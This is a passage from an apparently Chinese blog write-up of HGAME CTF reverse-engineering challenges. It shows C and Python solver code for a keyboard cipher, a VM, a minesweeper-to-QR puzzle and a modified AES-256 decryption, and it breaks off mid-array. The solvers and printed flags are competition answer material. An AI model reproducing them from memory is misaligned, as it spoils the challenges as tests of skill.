class="number">32</span>, <span class="number">23</span>,</span><br><span class="line">  <span class="number">68</span>, <span class="number">24</span>, <span class="number">41</span>, <span class="number">48</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> s1[] = <span class="string">"1234567890-+"</span>;</span><br><span class="line"><span class="keyword">char</span> s2[] = <span class="string">"QWERTYUIOP&#123;&#125;|"</span>;</span><br><span class="line"><span class="keyword">char</span> s3[] = <span class="string">"ASDFGHJKL;'"</span>;</span><br><span class="line"><span class="keyword">char</span> s4[] = <span class="string">"ZXCVBNM,./"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">50</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">21</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">b[i] = s1[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">37</span>; i &lt;= <span class="number">49</span>; i++)</span><br><span class="line">b[i] = s2[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">54</span>; i &lt;= <span class="number">64</span>; i++)</span><br><span class="line">b[i] = s3[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">66</span>; i &lt;= <span class="number">75</span>; i++)</span><br><span class="line">b[i] = s4[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">flag[i] = b[a[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>二血。</p><p>一个简单的vm，调试跟踪得到先是找到输入的最后一位，开始从后向前进行指定值的异或运算，紧接着一轮从后向前的减法运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">207</span>, <span class="number">191</span>, <span class="number">128</span>,  <span class="number">59</span>, <span class="number">246</span>, <span class="number">175</span>, <span class="number">126</span>,   <span class="number">2</span>,  <span class="number">36</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">112</span>,  <span class="number">58</span>, <span class="number">244</span>, <span class="number">235</span>, <span class="number">122</span>,  <span class="number">74</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">162</span>, <span class="number">103</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">240</span>, <span class="number">198</span>, <span class="number">118</span>,  <span class="number">54</span>, <span class="number">232</span>, <span class="number">173</span>, <span class="number">130</span>,  <span class="number">46</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">183</span>,  <span class="number">79</span>, <span class="number">230</span>,   <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = <span class="number">0xfe</span>, b = <span class="number">0x7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] += b;</span><br><span class="line">b -= <span class="number">0x60</span>;</span><br><span class="line">enc[i] ^= a;</span><br><span class="line">a += <span class="number">0x23</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h3><p>一个扫雷游戏，第一步操作后，如果后面时间超过5s的话游戏结束。这个修改下系统时间就解除了。</p><p>找到关键数据文件夹：</p><p><img src="https://i.loli.net/2021/02/27/oezlBwiY5mTZuOA.png" alt="image-20210227114208257"></p><p>反编译AFiveSecondChallenge.dll：看到获取当前系统的时间，检查是否超时的函数，题目描述的一样，对dll做了手脚，也是<strong>CheckBomAt</strong>这个函数，最后有很多数据，从数量可以猜测对应我们题目中的45*45的格子。</p><p><img src="https://i.loli.net/2021/02/27/CyHbQdXat52eZkR.png" alt="image-20210227114516330"></p><p>现在目的就是找<strong>CheckBomAt</strong>函数，开始想的是可能有办法修复这个dll，搜索一番没有结果。</p><p>转到刚刚那个文件夹的，发现2个关键cpp文件：AFiveSecondChallenge.cpp，Assembly-CSharp.cpp。</p><p>在AFiveSecondChallenge.cpp中发现反编译不出来的函数：从名字可以很好识别其功能，开始做一个超时检查，如果没超时取出matrix中的数据做一个运算后判断。</p><p><img src="https://i.loli.net/2021/02/27/NdvUQpMXrFontj9.png" alt="image-20210227120034686"></p><p>然后从Assembly-CSharp.cpp中看到了整个游戏逻辑。注释相当于把源码都给了吧，真好。</p><p>捕捉鼠标点击后，开始进行各种判断。</p><p><img src="https://i.loli.net/2021/02/27/4rOwLYtVzcUlDmf.png" alt="image-20210227120525813"></p><p>计算周围的雷数，就是判断8个方向，也可以看出返回值为0代表不是雷：</p><p><img src="https://i.loli.net/2021/02/27/e9vF4mky3D5oiHp.png" alt="image-20210227122637114"></p><p>点击后，根据是雷或者不是雷填充对应的色块：</p><p><img src="https://i.loli.net/2021/02/27/kB8jiNXfsgQzJ4H.png" alt="image-20210227122902913"></p><p>如果点击块周围没有雷，则递归的向四个方向扩展开来：</p><p><img src="https://i.loli.net/2021/02/27/gD1dcpLSm9QAvo2.png" alt="image-20210227123011364"></p><p>分析到这里想找最后胜利的判断条件以此看flag怎么来的，好像没有，。。</p><p>到这里知道了关键就是判断一个块是否是雷的函数<strong>CheckBomAt</strong>，按照题目的算法打印出雷的位置，1表示雷。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> a[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;游戏中的数据&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> ans;</span><br><span class="line"><span class="keyword">double</span> a_, b_, c_, d_;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, bomb[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a_ = a[j][i/<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">b_ = a[j][i/<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">c_ = a[j][i/<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">d_ = (<span class="keyword">double</span>)(i%<span class="number">3</span> - <span class="number">1.0</span>);</span><br><span class="line">ans = (a_*d_*d_ + b_*d_) + c_;</span><br><span class="line">bomb[j][i] = ans &gt; <span class="number">0.0</span> ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, bomb[i][j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用这个数据玩了一下游戏，但是有的地方和算出的雷的位置不一致，大多数还是一样的。。然后一直找是不是哪里算错了，算法也比对了好几次。。就把题放一边了。</p><p>后面看见题目给出提示，二维码，看了看我之前打印的数据。。。</p><p><img src="https://i.loli.net/2021/02/27/iQqyeAYgFaJVoMc.png" alt="image-20210227020942288"></p><p>使用python的PIL模块用这个数据打印出二维码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line">y = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (x, y))</span><br><span class="line">data = <span class="stringspan></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = data[i*x+j]</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">'1'</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>扫一下得到flag：<strong>hgame{YOU<del>hEn-duO_yOU-X|</del>DOU-sHi<del>un1Ty</del>k4i-fA_de_O}</strong></p><h3 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h3><p>一血。</p><p>通过这个题学习熟悉下AES加密算法还是不错的。</p><p>首先看一下main函数：先设置控制台显示文本的属性，接着可以看到很多异或运算，这些数据在要使用后同样做了相同的异或运算，所以简单隐藏了下程序中的数据。</p><p><img src="https://i.loli.net/2021/02/27/p7NOiGZoXHwMrKW.png" alt="image-20210223230432003"></p><p>找到加密的地方，开始静态看了一下整个加密流程，只是注意到很多异或运算也不复杂，在一个置位的地方发现加密后的一个aes的s-box。</p><p>确定aes加密后，又进而发现是带有iv的。</p><p><img src="https://i.loli.net/2021/02/27/cpix3L91BESXuGe.png" alt="image-20210223231923153"></p><p>再梳理了一下这里的加密流程：</p><p><img src="https://i.loli.net/2021/02/27/WRM9vQi1HZD8O7e.png" alt="image-20210223233754450"></p><p>可以从重复轮进行了13次可以知道key是256位的，但块长度是128位的。。之前一直以为密钥长度和块长度是一样的。又加上这里移位和混合的方向和我之前了解的正好相反，就感觉是魔改过的aes加密，开始用C自己写逆过程，关键就是行混合不好写，还好有搜索，hh。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> rsbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line">  <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line">  <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span> &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4c</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x4b</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0xbf</span>, <span class="number">0x8f</span>, <span class="number">0x84</span>, <span class="number">0x8d</span>, <span class="number">0xcb</span>, <span class="number">0xe0</span>, <span class="number">0xc2</span>, <span class="number">0xcc</span>, <span class="number">0x82</span>, <span class="number">0xac</span>, <span class="number">0x97</span>, <span class="number">0x9e</span>, <span class="number">0xc7</span>, <span class="number">0xca</span>, <span class="number">0xf8</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0xa4</span>, <span class="number">0x13</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0xc1</span>, <span class="number">0x6a</span>, <span class="number">0x19</span>, <span class="number">0x96</span>, <span class="number">0xe0</span>, <span class="number">0x4b</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0x0e</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x6c</span>, <span class="number">0xc5</span>, <span class="number">0x68</span>, <span class="number">0xef</span>, <span class="number">0xa0</span>, <span class="number">0x47</span>, <span class="number">0xc4</span>, <span class="number">0x78</span>, <span class="number">0x3e</span>, <span class="number">0x80</span>, <span class="number">0x0e</span>, <span class="number">0x80</span>, <span class="number">0xd2</span>, <span class="number">0x59</span>, <span class="number">0x8c</span>, <span class="number">0xcd</span>, <span class="number">0x49</span>, <span class="number">0xfd</span>, <span class="number">0x9f</span>, <span class="number">0xf5</span>, <span class="number">0xfe</span>, <span class="number">0x3c</span>, <span class="number">0xf5</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xdc</span>, <span class="number">0xbe</span>, <span class="number">0xd4</span>, <span class="number">0xdf</span>, <span class="number">0xa4</span>, <span class="number">0xc0</span>, <span class="number">0xb3</span>, <span class="number">0xea</span>, <span class="number">0x61</span>, <span class="number">0xa8</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x62</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0x7d</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x6d</span>, <span class="number">0x80</span>, <span class="number">0xb9</span>, <span class="number">0x71</span>, <span class="number">0x93</span>, <span class="number">0xbc</span>, <span class="number">0x4c</span>, <span class="number">0x9d</span>, <span class="number">0xfb</span>, <span class="number">0x60</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0xfb</span>, <span class="number">0x85</span>, <span class="number">0x3a</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, <span class="number">0xd9</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0xfd</span>, <span class="number">0x04</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x59</span>, <span class="number">0xa2</span>, <span class="number">0x61</span>, <span class="number">0x6a</span>, <span class="number">0x4f</span>, <span class="number">0x57</span>, <span class="number">0xe1</span>, <span class="number">0xd3</span>, <span class="number">0x3e</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x9f</span>, <span class="number">0xa3</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0xea</span>, <span class="number">0x1b</span>, <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0x2a</span>, <span class="number">0x1d</span>, <span class="number">0x4d</span>, <span class="number">0x2f</span>, <span class="number">0xf3</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x10</span>, <span class="number">0x0e</span>, <span class="number">0x69</span>, <span class="number">0xeb</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcb</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x69</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0xb3</span>, <span class="number">0x09</span>, <span class="number">0xa8</span>, <span class="number">0x63</span>, <span class="number">0xa8</span>, <span class="number">0xeb</span>, <span class="number">0x87</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0x1b</span>, <span class="number">0x71</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x62</span>, <span class="number">0xf5</span>, <span class="number">0x42</span>, <span class="number">0xd3</span>, <span class="number">0x22</span>, <span class="number">0x6f</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x35</span>, <span class="number">0x12</span>, <span class="number">0xa2</span>, <span class="number">0x7f</span>, <span class="number">0xf0</span>, <span class="number">0x9b</span>, <span class="number">0x11</span>, <span 